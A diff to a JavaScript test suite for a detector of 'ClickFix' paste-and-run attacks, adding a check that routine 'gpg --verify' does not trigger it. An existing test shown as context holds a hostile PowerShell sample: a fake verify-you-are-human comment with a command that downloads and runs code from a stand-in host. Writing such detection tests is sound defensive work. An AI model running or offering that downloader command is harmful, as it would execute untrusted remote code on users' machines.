@@ -122,6 +122,9 @@ describe('ClickFix / paste-and-run', () => {
   it('fires on a CAPTCHA/verify-human decoy paired with a downloader', () => {
     expect(ids("# verify you are human - ray id 8f2 #; IEX (iwr http://evil.test/x).Content")).toContain('clickfix')
   })
+  it('benign twin: gpg --verify (routine signature verification) does NOT fire — a bare --verify needs real ClickFix context', () => {
+    expect(ids('gpg --verify sig.asc release.tar')).not.toContain('clickfix')
+  })
 })
 
 describe('beaconing + reverse shell + loaders + persistence', () => {
